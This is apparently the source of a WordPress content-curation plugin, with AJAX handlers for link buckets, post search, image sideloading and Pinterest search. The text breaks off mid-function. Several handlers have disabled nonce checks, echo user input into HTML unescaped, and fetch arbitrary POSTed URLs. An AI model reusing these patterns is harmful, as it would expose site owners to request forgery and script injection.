<?php
use seregazhuk\PinterestBot\Factories\PinterestBot;
/**
 * This takes a starting number and a limit and returns what the start should be a for a API call. Which really resolves to what the offset should be within the API
 * This is used for most of the pagination functions within our API here.
 *
 * @param int $start the starting number for the offset
 * $param int $limit the limit value for the offset
 *
 * @return int $start the starting value to start the results at for a proper offset
 */
function ybi_get_start_offset($start, $limit)
{
    if ($start <= 1)
        $start = 0;
    else
        $start = (($start - 1) * $limit) - 1;
    return $start;
}

/**
 * This takes a starting number and a limit and returns what the start should be a for a API call. Which really resolves to what the offset should be within the API
 * This is used for most of the pagination functions within our API here.
 *
 * @param int $start the starting number for the offset
 * $param int $limit the limit value for the offset
 *
 * @return int $start the starting value to start the results at for a proper offset
 */
function ybi_get_page_start_offset($start, $limit)
{
    if ($start <= 1)
        $start = 0;
    else
        $start = ($start - 1) * $limit;
    return $start;
}
/**
 *  resolves URL to final url (simple)
 *
 * @param string $url url to be finalized
 *
 * @return string final url
 */
function cs_resolveShortURL($url) {
    $ch = curl_init("$url");
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $yy = curl_exec($ch);
    curl_close($ch);
    $w = explode("\n",$yy);
    $TheShortURL = array_values( preg_grep( '/' . str_replace( '*', '.*', 'Location' ) . '/', $w ) );
    $url = $TheShortURL[0];
    $url = str_replace("Location:", "", "$url");
    $url = trim("$url");
    return $url;
}

/**
 *  Gets the pagination HTML for results.
 *
 * @param int $total results total
 * @param int $items_per_page that are displayed per page
 * @param int $current_page current page of the reslts
 * @param int $mid_range range value of the results
 * @param string $move_page_class string class that should be assigned to the page value (primarily used for CSS and jQuery)
 *
 * @return string pagination html
 */
function ybi_get_page_row($total, $items_per_page, $current_page, $mid_range, $move_page_class)
{
    require_once(YBI_CURATION_SUITE_PATH . "lib/paginator.php");
    $pages = new Paginator;
    $pages->move_page_class = $move_page_class;
    $pages->items_total = $total;
    $pages->items_per_page = $items_per_page;
    $pages->current_page = $current_page;
    $pages->mid_range = $mid_range;
    $pages->paginate();
    return $pages->display_pages();
}

/**
 * Wrapper method to return the right display elements for a API notidce message
 *
 * @param string $location location of message (not used yet)
 * @param string $api_status the status of the message - typically will be status|notice|error
 * @param string $api_message the message to be displayed
 *
 * @return string $return_message html string to be displayed
 */
function add_api_message_controller($location, $api_status, $api_message)
{
    $return_message = '';
    if ($api_status == 'success') {
        if ($api_message)
            $return_message .= '<div class="le_message success_message">' . $api_message . '</div>';

    } elseif ($api_status == 'notice') {
        $return_message .= '<div class="le_message api_notice">' . $api_message . '</div>';
    } else {
        $return_message .= '<div class="le_message api_error">' . $api_message . '</div>';
    }
    return $return_message;
}

/**
 * This function will validate an API key.
 *
 *
 * @return JSON values
 */
function set_curation_suite_listeing_api()
{
    $api_key = trim($_POST['api_key']);  // get the api key
    $send_data = array();
    // notice here teh route includes the API key and the last variable is true, that means it will use the route instead of appending the API key
    // there other way we might go is set the API option here and then just do a normal route
    $data = ybi_curation_suite_api_call('validate-api-key/'.$api_key, $send_data, array(), true);
    $api_action = 'validate-api-key';
    $status = $data['status'];
    if ($status == 'success') {
        $message = 'API connected. Please reload page.';
        update_option('curation_suite_listening_api_key', $api_key); // add the api key to the options
        delete_option('ybi_cs_platform_defaults'); // since we don't know if this is a new platform or an old one we delete the defaults
    } else {
        $message = $data['message'];
    }
    echo json_encode(array('status' => $status, 'message' => $message));
    die();
}

add_action('wp_ajax_set_curation_suite_listeing_api', 'set_curation_suite_listeing_api');
/**
 * This searches the curation links
 *
 * @since 1.0 Curation Suite
 *
 * @return string|json response with results of search.
 */
function ybi_curation_suite_search_posts()
{
    if (wp_verify_nonce($_POST['curate_action_search_nonce'], 'curate_action_search_nonce')) {
        $search_query = trim($_POST['user_name']);
        $curate_url = trim($_POST['curate_url']);
        $post_type_arr = ybi_cu_get_post_type_feature();
        $args = array(
            'post_status' => 'publish',
            's' => $search_query,
            'showposts' => 10,
            'post_type' => $post_type_arr
        );
        $post_list = '';
        $my_query = new WP_Query($args);
        $alternate = '';
        if ($my_query->have_posts()) {
            $post_list .= '<h2><i class="fa fa-search-plus"></i> Search Results For: <em>' . $search_query . '</em></h2>';
            $post_list .= '<table class="wp-list-table widefat fixed posts" cellspacing="0">';
            $i = 1;
            while ($my_query->have_posts()) :

                if (0 != $i % 2): $alternate = ' alternate'; endif;

                $my_query->the_post();
                $post_url = self_admin_url('post.php?post=' . get_the_ID() . '&action=edit&u=' . $curate_url);

                $post_list .= '<tr class="type-post status-publish format-standard hentry category-marketing' . $alternate . ' iedit author-self level-0"><td class="post-title page-title column-title">
			 <a href="' . $post_url . '">' . get_the_title() . '</a> (by ' . get_the_author() . ' on ' . get_the_date() . ')</td></tr>';
                $i++;
                $alternate = '';
            endwhile;
            $post_list .= '</table>';
            echo json_encode(array('results' => $post_list, 'id' => 'found'));
        } else {
            $post_list .= '<h2><i class="fa fa-search-plus"></i> No Posts Found For: <em>' . $search_query . '</em></h2>';
            echo json_encode(array('results' => $post_list, 'id' => 'found'));
        }

    }

    die();
}

add_action('wp_ajax_ybi_curation_suite_search_posts', 'ybi_curation_suite_search_posts');
/**
 * Deletes a link in the Curation Links
 *
 * @since 1.0 Curation Suite
 *
 * @return string|json response telling  user post was deleted
 */
function ybi_curation_suite_delete_bucket_link()
{
//	if( wp_verify_nonce($_POST['curate_action_search_nonce'], 'curate_action_search_nonce'))
    {
        $post_list = '';
        $curation_link_id = trim($_POST['curation_link_id']);
        $args = array(
            'post_status' => 'publish',
            'showposts' => 10
        );
        wp_trash_post($curation_link_id);
        //delete_post_meta($curation_link_id, '_bucket_url');
        //delete_post_meta($curation_link_id, '_bucket_url_domain');
        //wp_reset_postdata();
        $post_list .= 'post deleted';
        echo json_encode(array('results' => $post_list, 'id' => 'found'));

    }
    die();
}

add_action('wp_ajax_ybi_curation_suite_delete_bucket_link', 'ybi_curation_suite_delete_bucket_link');
/**
 * Modified version of core function media_sideload_image() in /wp-admin/includes/media.php  (which returns an html img tag instead of attachment ID)
 * Additional functionality: ability override actual filename, and to pass $post_data to override values in wp_insert_attachment (original only allowed $desc)
 *
 * @since 1.4 Somatic Framework
 *
 * @param string $url (required) The URL of the image to download
 * @param int $post_id (required) The post ID the media is to be associated with
 * @param bool $thumb (optional) Whether to make this attachment the Featured Image for the post (post_thumbnail)
 * @param string $filename (optional) Replacement filename for the URL filename (do not include extension)
 * @param array $post_data (optional) Array of key => values for wp_posts table (ex: 'post_title' => 'foobar', 'post_status' => 'draft')
 * @return int|object The ID of the attachment or a WP_Error on failure
 */
function ybi_cu_attach_external_image($url = null, $post_id = null, $thumb = null, $filename = null, $post_data = array())
{
    if (!$url || !$post_id) return new WP_Error('missing', "Need a valid URL and post ID...");
    require_once(ABSPATH . 'wp-admin/includes/file.php');
    // Download file to temp location, returns full server path to temp file, ex; /home/user/public_html/mysite/wp-content/26192277_640.tmp
    //$url = strtolower($url);
    $tmp = download_url($url);

    // If error storing temporarily, unlink

    if (is_wp_error($tmp)) {
        @unlink($file_array['tmp_name']);   // clean up
        $file_array['tmp_name'] = '';
        return $tmp; // output wp_error
    }

    preg_match('/[^\?]+\.(jpg|JPG|jpe|JPE|jpeg|JPEG|gif|GIF|png|PNG|img|IMG)/', $url, $matches);    // fix file filename for query strings
    $url_filename = basename($matches[0]);                                                  // extract filename from url for title
    $url_filename = preg_replace('/\s|%20/', '-', $url_filename);
    $url_type = wp_check_filetype($url_filename);                                           // determine file type (ext and mime/type)

    // override filename if given, reconstruct server path
    if (!empty($filename)) {
        $filename = sanitize_file_name($filename);
        $tmppath = pathinfo($tmp);                                                        // extract path parts
        $new = $tmppath['dirname'] . "/" . $filename . "." . $tmppath['extension'];          // build new path
        rename($tmp, $new);                                                                 // renames temp file on server
        $tmp = $new;                                                                        // push new filename (in path) to be used in file array later
    }

    // assemble file data (should be built like $_FILES since wp_handle_sideload() will be using)
    $file_array['tmp_name'] = $tmp;                                                         // full server path to temp file

    if (!empty($filename)) {
        $file_array['name'] = $filename . "." . $url_type['ext'];                           // user given filename for title, add original URL extension
    } else {
        $file_array['name'] = $url_filename;                                                // just use original URL filename
    }

    // set additional wp_posts columns
    if (empty($post_data['post_title'])) {
        $post_data['post_title'] = basename($url_filename, "." . $url_type['ext']);         // just use the original filename (no extension)
    }

    // make sure gets tied to parent
    if (empty($post_data['post_parent'])) {
        $post_data['post_parent'] = $post_id;
    }

    // required libraries for media_handle_sideload
    require_once(ABSPATH . 'wp-admin/includes/file.php');
    require_once(ABSPATH . 'wp-admin/includes/media.php');
    require_once(ABSPATH . 'wp-admin/includes/image.php');

    // do the validation and storage stuff
    $att_id = media_handle_sideload($file_array, $post_id, null, $post_data);             // $post_data can override the items saved to wp_posts table, like post_mime_type, guid, post_parent, post_title, post_content, post_status

    // If error storing permanently, unlink
    if (is_wp_error($att_id)) {
        @unlink($file_array['tmp_name']);   // clean up
        return $att_id; // output wp_error
    }

    // set as post thumbnail if desired
    $thumb_html = '';
    if ($thumb) {
        set_post_thumbnail($post_id, $att_id);
        // next we have to add the content to the meta box
        $thumbnail_id = get_post_meta($post_id, '_thumbnail_id', true); // get the thumbnail id
        $Post = get_post($post_id); // we need the post object b/c the function below uses it to create the html and nonce
        $thumb_html = _wp_post_thumbnail_html($thumbnail_id, $Post); // the full html for the meta box that includes all functionality.
    }
    // we return the src instead of the att_id
    $src = wp_get_attachment_url($att_id);
    $return_arr = array('src' => $src, 'thumb_meta_html' => $thumb_html);
    //return $src;
    return $return_arr;
}

/**
 *  JSON - This function uploads an image or thumbnail, the worker function is the function above ybi_cu_attach_external_image
 *    This returns a json_encode(status, upload_img_url, og_image_url, debug, meta_html, set_featured)
 *
 * @since 1.2
 */
function ybi_cu_upload_image()
{
    $status = true;
    $img_url = trim($_POST['img_url']);
    $url = $img_url;
    $post_ID = trim($_POST['post_ID']);
    $set_featured = trim($_POST['set_featured']) == 'true';

    $desc = 'uploaded from curated content';
    $upload_img_url = '';

    $img_url_modified = $img_url;
    if (strpos($img_url, 'https://s.wordpress.com/mshots/v1') !== false) {
        $img_url_modified .= '.jpg';
    }


    //$img_url_modified = html_entity_decode($img_url_modified);
    // $img_url_modified = str_replace(' ', '%20', html_entity_decode($img_url_modified));
    //$debugS .= $img_url_modified ;
    //$upload = ybi_cu_attach_external_image($img_url_modified, $post_ID, $set_featured);
    if(ybi_startsWith($img_url,'//')) {
        // if the upload url is non specific we assume it should be https and add it. We could add some more logic here but SSL is where the web is going.
        $img_url_modified = 'https:'.$img_url_modified;
    }

    $upload_arr = ybi_cu_attach_external_image($img_url_modified, $post_ID, $set_featured);
    $upload = $upload_arr['src'];
    $meta_html = $upload_arr['thumb_meta_html'];
    // if there is an error an object is returned, we should in the future get this error and display it somewhere.
    if (is_object($upload))
        $status = false;

    // this converts the last &amp; sign so the replace works correctly after we send it
    $img_url = str_replace('&r=3', '&amp;r=3', $img_url);

    echo json_encode(array('status' => $status, 'upload_img_url' => $upload,
        'og_img_url' => $img_url, 'debug' => $upload, 'meta_html' => $meta_html, 'set_featured' => $set_featured));
    die();
}

add_action('wp_ajax_ybi_cu_upload_image', 'ybi_cu_upload_image');
/**
 * This function saves a single url to the meta elements of a post, it also checks to see if that url is already added, if it is it doesn't add it.
 *
 * @since 1.2
 *
 */
function ybi_cu_add_curated_url_to_meta()
{
    // get all the meta fields
    $url = trim($_POST['url']);
    $post_ID = trim($_POST['post_ID']);
    $current_links = get_post_meta($post_ID, 'cu_curated_links', false);  // get the existing urls, this returns an array
    $addLink = true; // we default to add
    if ($current_links) {
        // if the link exist we don't add it
        if (in_array($url, $current_links))
            $addLink = false;
    }
    // we add all links to the same meta key for this post
    if ($addLink)
        add_post_meta($post_ID, 'cu_curated_links', $url);


    // log the action
    $action_response = cs_action_log('quick-add', $url);
    die();

}

add_action('wp_ajax_ybi_cu_add_curated_url_to_meta', 'ybi_cu_add_curated_url_to_meta');

/**
 * This function saves a twitter user to the meta elements of a post, it also checks to see if that user is already added, if it is it doesn't add it.
 *
 * @since 2.0
 */
function ybi_cu_add_twitter_data_to_meta()
{
    // get all the meta fields
    $twitter_username = trim($_POST['twitter_username']);
    $tweet_status_id = trim($_POST['tweet_status_id']);
    $post_ID = trim($_POST['post_ID']);
    $current_data = get_post_meta($post_ID, 'cu_twitter_data', false);  // get the existing urls, this returns an array

    $twitter_data_arr = array('username' => $twitter_username, 'twitter_status_id' => $tweet_status_id);
    $add_data = true; // we default to add
    if ($current_data) {
        foreach ($current_data as $twitter_data) {
            if ($twitter_data['twitter_status_id'] == $tweet_status_id) {
                $add_data = false;
                break;
            }

        }
        // if the link exist we don't add it
        //if(in_array($url, $current_links))
        //	$add_data = false;
    }
    // we add all links to the same meta key for this post
    if ($add_data)
        add_post_meta($post_ID, 'cu_twitter_data', $twitter_data_arr);
    die();
}

add_action('wp_ajax_ybi_cu_add_twitter_data_to_meta', 'ybi_cu_add_twitter_data_to_meta');

// this function is passed tags and ensures they are unique, then sends over a comma seperted string that is used in the sidebar for the saved curated tags
function ybi_cu_saved_tags()
{

    $status = false;
    $inExistingTags = trim($_POST['inExistingTags']);
    $inNewTags = trim($_POST['inNewTags']);
    $all_tags_combined = $inExistingTags . ', ' . $inNewTags;

    $pieces = array_map('trim', explode(',', $all_tags_combined)); // explode all tags and apply trim to each one
    $pieces = array_unique($pieces); // ensure the are unique
    sort($pieces); // apply default sorting (alpha)

    $i = 1;
    $tagsCombined = '';
    foreach ($pieces as $val) {

        if ($val != ''):
            if ($i > 1)
                $tagsCombined .= ', ';
            $tagsCombined .= $val;
            $i++;
        endif; //if($val != '')
    }

    echo json_encode(array('status' => $status, 'all_tags' => $tagsCombined));

    die();
}

add_action('wp_ajax_ybi_cu_saved_tags', 'ybi_cu_saved_tags');

// this is the main function for loading link buckets
function ybi_curation_suite_get_bucket_links()
{

//	if( wp_verify_nonce($_POST['curate_action_search_nonce'], 'curate_action_search_nonce'))
    {
        // bucket_search_term bucket_category_id bucket_link_sort_order bucket_link_author_id
        //$isTextSearch = trim($_POST['isTextSearch']);
        $search_query = trim($_POST['search_query']);
        $bucket_category_id = trim($_POST['bucket_category_id']);
        $bucket_link_sort_order = trim($_POST['bucket_link_sort_order']);
        $bucket_link_author_id = trim($_POST['bucket_link_author_id']);
        $current_page = trim($_POST['current_page']);
        $count_posts = wp_count_posts('curation_suite_links')->publish;


        $show_posts = 10;

        $args = array(
            'post_status' => 'publish',
            'post_type' => 'curation_suite_links',

        );
        if ($search_query != '') {
            $args['s'] = $search_query;
            //$post_list .= '<br>search_query: ' . $search_query;
        }

        if ($bucket_category_id != 0) {

            $term = get_term($bucket_category_id, 'link_buckets');
            $count_posts = $term->count;

            $args['tax_query'] =
                array(array(
                    'taxonomy' => 'link_buckets',
                    'field' => 'id',
                    'terms' => array($bucket_category_id)
                ));

        }
        $sort_order = 'DESC';
        if ($bucket_link_sort_order != '')
            $sort_order = $bucket_link_sort_order;

        $args['order'] = $sort_order;


        if ($bucket_link_author_id != 0) {
            $args['author'] = $bucket_link_author_id;
        }

        $args['posts_per_page'] = -1;
        $my_query = new WP_Query($args);
        if ($my_query->have_posts())
            $count_posts = $my_query->post_count;

        $totalPages = ($count_posts / $show_posts);
        if ($count_posts > 10) {
            $remainder = $count_posts % $show_posts;
            if ($remainder > 0)
                $totalPages = $totalPages + 1;
        } else {
            $totalPages = 1;
        }
        //$post_list .= '<br>count_posts' . $count_posts . '<br>totalPages' . $totalPages;
        if ($current_page <= 1)
            $page_offset = 0;
        else
            $page_offset = ($current_page - 1) * $show_posts;

        // this is for the delete action and if we are on the last page
        if ($page_offset == $count_posts) {
            $current_page = ($current_page - 1);
            $page_offset = ($current_page - 1) * $show_posts + 1;
        }

        $args['posts_per_page'] = $show_posts;
        $args['offset'] = $page_offset;
        $args['page'] = $current_page;
        $my_query = new WP_Query($args);
        $alternate = '';
        $post_list = '';
        if ($my_query->have_posts()) {

            $post_list .= '<table class="wp-list-table widefat fixed posts" cellspacing="0">';
            $i = 1;
            while ($my_query->have_posts()) :

                if (0 != $i % 2): $alternate = ' alternate'; endif;

                $my_query->the_post();
                $url = get_post_meta(get_the_ID(), '_bucket_url', true);
                $source = get_post_meta(get_the_ID(), '_bucket_url_domain', true);
                $linkNotes = get_the_content();
                if ($source != '')
                    $source = " from " . $source;

                $post_list .= '<tr class="type-post status-publish format-standard hentry' . $alternate . '"><td class="post-title page-title column-title link_bucket_text">
				 <strong><a target="_blank" href="' . $url . '">' . get_the_title() . '</a></strong> Added by <span class="link_author">' . get_the_author() . '</span> on ' . get_the_date() . ' <span class="link_source">' . $source . '</span>';

                if ($linkNotes)
                    $post_list .= '<br /><span class="link_notes"><em>Notes:</em> ' . $linkNotes . '</span>';

                $post_list .= '</td>
				 <td class="link_bucket_actions">
				 <a href="javascript:;" class="link_to_load" name="' . ($url) . '">Curate</a> | 
				 <a href="javascript:;" class="link_to_load" name="' . ($url) . '" rel="' . get_the_ID() . '">Curate/Delete</a> | 
				 <a href="javascript:;" class="delete_curation_link" name="' . get_the_ID() . '"><i class="fa fa-trash-o fa-lg"></i> Delete</a>
				 </td></tr>';
                $i++;
                $alternate = '';
            endwhile;
            $post_list .= '</table>';


            //$current_page = $page_offset / $show_posts;

            if ($current_page == 0)
                $current_page = 1;

            $post_list .= '<div id="curation_links_pages">';
            for ($i = 1; $i <= $totalPages; $i++) {
                if ($current_page == $i)
                    $post_list .= '<span class="cu_link_page current_page" rel="' . ($i) . '">' . $i . '</span>';
                else
                    $post_list .= '<a href="javascript:;" class="cu_link_change_page" rel="' . ($i) . '">' . $i . '</a>';
            }
            $post_list .= '</div>';
            echo json_encode(array('results' => $post_list, 'current_page' => $current_page, 'total_posts_display' => $count_posts));
        } else {
            $count_posts = 0;
            $post_list .= '<h2><i class="fa fa-search-plus"></i> No Links Found<em> ' . $search_query . '</em></h2>';
            echo json_encode(array('results' => $post_list, 'total_posts_display' => $count_posts));
        }
    }
    die();
}

add_action('wp_ajax_ybi_curation_suite_get_bucket_links', 'ybi_curation_suite_get_bucket_links');

function getCQSLink($i, $url, $details)
{
    return '<a href="javascript:;" class="get_cqs cqs_link_' . $i . '" rel="cqs_link_' . $i . '" name="' . ($url) . '" details="' . $details . '">---</a>';
}

function getAddToPostLink($i, $url, $prefix = '', $noun = '')
{
    return $prefix . '<a href="javascript:;" class="content_search_add_to_post" rel="' . ($url) . '" data-link-no="' . $i . '">Add to ' . $noun . ' Post</a>';
}

// this will return all the sharing icons.
function getSocialShareBlock($update_text, $permalink)
{
    $update_text = html_entity_decode(trim($update_text), 0, 'UTF-8');
    $update_text = urlencode($update_text);
    $permalink = urlencode($permalink);
    return '<div class="social_share_demand"><a href="http://hootsuite.com/hootlet/load?title=' . $update_text . '&address=' . $permalink . '" target="_blank" class="hootsuite"><img class="hootsuite_share" src="' . plugins_url('youbrandinc_products/i/hootsuite-icon_24.png') . '" /></a>
			<a href="http://bufferapp.com/bookmarklet/?text=' . $update_text . '&url=' . $permalink . '" target="_blank" class="buffer"><img class="buffer_share" src="' . plugins_url('youbrandinc_products/i/buffer-logo.png') . '" /></a>
			<br>
			<a href="http://www.twitter.com/home?status=' . $update_text . ' - ' . $permalink . '" target="_blank" class="twitter"><i class="fa fa-twitter fa-2x twitter"></i></a>
			<a href="http://www.facebook.com/sharer.php?s=100&p[title]=' . $update_text . '&p[url]=' . $permalink . '" target="_blank" class="facebook"><i class="fa fa-facebook fa-2x facebook"></i></a>
			<a href="http://www.linkedin.com/shareArticle?mini=true&title=' . $update_text . '&url=' . $permalink . '" target="_blank" class="linkedin"><i class="fa fa-linkedin fa-2x linkedin"></i></a>
			<a href="https://plus.google.com/share?url=' . $permalink . '" target="_blank" class="googleplus"><i class="fa fa-google-plus fa-2x google-plus"></i></a>
			<a href="http://www.tumblr.com/share?v=3&u=' . $permalink . '&title=' . $update_text . '" target="_blank" class="tumblr"><i class="fa fa-tumblr fa-2x"></i></a></div>';
}

function getQuickAddButtons($item_id)
{
    return '<div class="btn-group quick_buttons">
              <a class="btn btn-default quick_add_to_post_box" title="Add to Post with Image Left" href="javascript:;" rel="alignleft" ci="' . $item_id . '" after-curation-action="curate"><i class="fa fa-align-left"></i></a>
              <a class="btn btn-default quick_add_to_post_box" title="Add to Post with Image Center" href="javascript:;" rel="aligncenter" ci="' . $item_id . '" after-curation-action="curate"><i class="fa fa-align-center"></i></a>
              <a class="btn btn-default quick_add_to_post_box" title="Add to Post with Image Right" href="javascript:;" rel="alignright" ci="' . $item_id . '" after-curation-action="curate"><i class="fa fa-align-right"></i></a>
			  <div class="q_msg ci_msg' . $item_id . '"></div>
            </div>';

}

function getImageActionLinks($i)
{
    return '<div class="found_image_w"><a href="javascript:;" class="add_image_to_post" data-id="thumb_lp' . $i . '"><i class="fa fa-plus"></i> Add to Post</a>
		 <a href="javascript:;" class="set_image_featured" data-id="thumb_lp' . $i . '"><i class="fa fa-star"></i> Set Featured</a></div>';
}

function cs_isImageFile($file)
{
    $info = pathinfo($file);
    return in_array(strtolower($info['extension']),
        array("jpg", "jpeg", "gif", "png", "bmp"));
}

function cs_getYouTubeVideoID($url)
{
    //http://stackoverflow.com/questions/3392993/php-regex-to-get-youtube-video-id
    preg_match("/^(?:http(?:s)?:\/\/)?(?:www\.)?(?:youtu\.be\/|youtube\.com\/(?:(?:watch)?\?(?:.*&)?v(?:i)?=|(?:embed|v|vi|user)\/))([^\?&\"'>]+)/", $url, $matches);
    $video_id = '';
    if ($matches)
        $video_id = $matches[1];
    return $video_id;
}

function get_content_item_row_for_search($i, $title, $current_url, $imageURL, $snippet, $publisherName, $pubDate, $load_direct_share, $content_data='', $highlight_curated_content=false, $use_add_to_post_link=false)
{
    $highlight_class = '';
    $html ='';
    $alternate = '';
    if (0 != $i % 2): $alternate = ' alternate'; endif;
    $post_highlighted = false;
    if($highlight_curated_content) {
        global $wpdb;
        $keyword = '%' . $wpdb->esc_like( $current_url ) . '%';
        // Search in all custom fields
        $post_ids_meta = $wpdb->get_col( $wpdb->prepare("SELECT DISTINCT post_id FROM {$wpdb->postmeta} WHERE meta_value LIKE '%s'", $keyword ) );
        if(count($post_ids_meta) > 0) {
            $highlight_class = ' cs_highlight_curated';
            $html .= '<tr class="type-post status-publish format-standard hentry' . $alternate . $highlight_class . '"><td colspan="2" style="width: 100%; padding: 0 40px;">';
            $html .= '<p class="center" style="padding: 10px 0 0;"><i class="fa fa-circle cs_good" aria-hidden="true"></i> <strong>Story Curated</strong></p>';
            $html .= '<p><a href="' . $current_url . '" target="_blank">' . $title . '</a></p>';
            foreach ($post_ids_meta as $post_id) {
                $Post = get_post($post_id);
                $html .= '<p style="padding-bottom: 15px;"><strong>Curated on post</strong>: <a href="' . site_url('?p='.$post_id) . '" target="_blank"><i class="fa fa-external-link" aria-hidden="true"></i> ' . $Post->post_title . '</a> | <a href="' . admin_url('post.php?post='.$post_id.'&action=edit') . '" target="_blank" class="a_no_wrap"><i class="fa fa-pencil-square-o" aria-hidden="true"></i> edit</a></p>';
            }
            $post_highlighted = true;
        }
    }

    if(!$post_highlighted) {
        $html .= '<tr class="type-post status-publish format-standard hentry' . $alternate . $highlight_class . '">';

        if($imageURL!='')
            $imageURL = '<span class="content_demand_image_span"><img src="' . $imageURL . '" class="thumb_lp' . $i . '" />' . getImageActionLinks($i) . '</span>';

        $html .= '<td class="cs_on_demand_left">' . $imageURL . '<a href="' . $current_url . '" target="_blank" class="link_lp' . $i . '">' . $title . '</a> - <a href="javascript:;" class="add_to_title" rel="link_lp' . $i . '"><i class="fa fa-header"></i></a>';

        if($publisherName != '') {
            $html .= '<br />from ' . $publisherName;
        }
        if($pubDate != '') {
            $html .= ' published on ' . $pubDate;
        }

        if($content_data!='') {
            $html .= $content_data;
        }

        $add_to_post_link = '';
        if($use_add_to_post_link)
            $add_to_post_link = getAddToPostLink($i, $current_url) . ' | ';

        $html .= '<p class="snippet_lp' . $i . '">' . $snippet . '</p></td><td class="content_search_actions">'.$add_to_post_link.'<a href="javascript:;" class="link_to_load" name="' . ($current_url) . '">Curate</a>' ;
        //
        if ($load_direct_share)
            $html .= getSocialShareBlock($title, $current_url);

        if(!$use_add_to_post_link)
            $html .= getQuickAddButtons($i);
    }

    $html .= '</td></tr>';
    return $html;
}


// this function handles google news, google blogs, bing, and slideshare
function ybi_curation_suite_get_content_on_demand_search()
{
    $search_query = trim($_POST['search_query']);
    $search_type = trim($_POST['search_type']);
    $orderby = trim($_POST['orderby']);
    $time_frame = trim($_POST['time_frame']);
    $search_ignore = trim($_POST['search_ignore']);
    $total_results = trim($_POST['cs_total_results']);
    $language = trim($_POST['language']);
    $show_player = trim($_POST['show_player']);
    $load_direct_share = trim($_POST['load_direct_share']) == 'true';
    $cs_highlight_curated_content = trim($_POST['cs_highlight_curated_content']) == 'true';
    $options = get_option('curation_suite_data');
    $CurationSuiteProduct = new ybi_product('Curation Suite');
    if (do_validate_license($CurationSuiteProduct) !== true) {
        $start = 0;
        $c = 0;
        $post_list = '<h3 class="cs_bad center">Please enter your license key for Curation Suite&trade; using the You Brand, Inc. Licensing Plugin - <a href=" ' . self_admin_url('admin.php?page=youbrandinc-license') . '"> Enter License Here</p></h3>';
        echo json_encode(array('results' => $post_list, 'current_page' => $start, 'total_posts_display' => $c));
        die();
    }

    $start = trim($_POST['start']);

    $post_list = '<table class="wp-list-table widefat posts on-demand-table" cellspacing="0">';
    $i = 0;
    $c = 0;

    $send_data = array('search_type' => $search_type, 'search_term' => $search_query);
    $data = ybi_curation_suite_api_call('cs/on-demand/search/log', $send_data, array(), true);

    if ($data['status'] != 'success') {
        $search_type = '';
        $post_list .= '<h2><i class="fa fa-search-plus"></i> Searches Can Not Be Performed at this time.<em></em></h2>';
    }
    // this handles pagination for all but Google Bing and News searches (those have it built into the json response).
    require_once(YBI_CURATION_SUITE_PATH . "lib/paginator.php");

    // for searches cu-content-actions-meta.php
    if ($search_type == 'pinterest') {
        $service_access_good = true;
        // php version isn't high enough
        if (version_compare(phpversion(), '5.5.9', '>=')) {
            if (!class_exists('PinterestBot')) {
                require_once YBI_BASE_PATH . 'vendor/autoload.php';
            }
            if (array_key_exists('cs_pinterest_username', $options) && array_key_exists('cs_pinterest_password', $options)) {
                if ($options['cs_pinterest_username'] && $options['cs_pinterest_password']) {
                    $bot = PinterestBot::create();
                    $bot->auth->login($options['cs_pinterest_username'], $options['cs_pinterest_password']);
                    $pins = $bot->pins->search($search_query)->toArray();
                    $image_count = 1;

                    foreach ($pins as $pin) {
                        $pin_id = $pin['id'];
                        $pinterest_url = 'https://www.pinterest.com/pin/'.$pin_id .'/';
                        $date = new DateTime($pin['created_at']);
                        $pub_date = $date->format('Y-m-d H:i:s');
                        $pub_date = ''; // set it to blank so it wont show
                        $current_url = $pin['link'];
                        $publisher_name = $pin['domain'];
                        $title = $pin['title'];
                        if($title=='') {
                            if(array_key_exists('rich_summary',$pin)) {
                                $rich_summary = $pin['rich_summary'];
                                $title = $rich_summary['display_name'];
                                $current_url = $rich_summary['url'];
                            }
                            if($title=='') {
                                $pinner = $pin['pinner'];
                                $title = 'Pin Pinned By ' . $pinner['full_name'];
                            }
                        }
                        if($current_url=='') {
                            $current_url = $pinterest_url;
                        }

                        $snippet = $pin['description_html'];
                        $img_url = '';
                        $data_html = '';
                        $image_option_html = '<p><strong>Image Size Options:</strong></p>';
                        $shown_width_arr = array();
                        foreach ($pin['images'] as $key => $image_arr) {
                            // 736x, 474x, orig, 136x136,236x
                            if ($key == '236x') {
                                $img_url = $image_arr['url'];
                            }

                            if(!in_array($image_arr['width'],$shown_width_arr)) {
                                $image_option_html .= '<p><a class="cs_image_option_link cs_image_option_'.$image_count.'" href="'.$image_arr['url'].'" target="_blank">'.
                                    $image_arr['width'] . ' x ' . $image_arr['height'] .
                                    ' <i class="fa fa-external-link-square" aria-hidden="true"></i></a><br /><a href="javascript:;" class="cs_add_image_option_to_post" data-cs-image-number="'.$image_count.'">Add to Post</a> | 
                            <a href="javascript:;" class="cs_set_featured_image_option_to_post" data-cs-image-number="'.$image_count.'">Set Featured</a></p>';
                                $image_count++;
                                $shown_width_arr[]=$image_arr['width'];
                            }
                        }
                        $snippet .= $image_option_html;
                        $snippet .= '<br /><p><a class="cs_attribution_only_link" rel="link_lp'.$i.'" data-url="'.$pinterest_url.'" href="javascript:;">
                        <i class="fa fa-arrow-circle-left" aria-hidden="true"></i> Add Attribution Link</a> <span class="attribution_message_link_lp'.$i.'"></span></p>';

                        $post_list .= get_content_item_row_for_search($i, $title, $current_url, $img_url, $snippet, $publisher_name, $pub_date, $load_direct_share,$data_html,$cs_highlight_curated_content);
                        $i++;
                }
            }
            } else {
                $service_access_good = false;
            }
        } else {
            $post_list .= '<tr><td><h3 class="cs_bad center"><strong>PHP Version Not Valid</strong></h3>
<p>To use the Pinterest search you must have PHP version 5.5.9+ installed on your site. It appears your site is running PHP version: ' . phpversion(). '. Upgrading to php 5.5.9 should be possible and easy, check your host support page or login to your cpanel to perform the simple upgrade.</p></td></tr>';
        }

        if (!$service_access_good) {
            $post_list .= '<tr><td><h3 class="cs_bad center"><strong>Missing Pinterest Credentials</strong>. <a href="' . admin_url('admin.php?page=curation_suite_display_settings') . '" target="_blank">Click Here to Enter Your Pinterest Credentials</a></h3></td></tr>';
        }

        $post_list .= '</table>';
    } //if($search_type == 'pinterest')

    if ($search_type == 'curation_bot') {

        if ($start == '' || $start == 0)
            $startCalcNum = 0;
        else
            $startCalcNum = ($start - 1) * 10;

        $send_data = array('search_type' => $search_type, 'search_term' => $search_query, 'order_by' => $orderby);
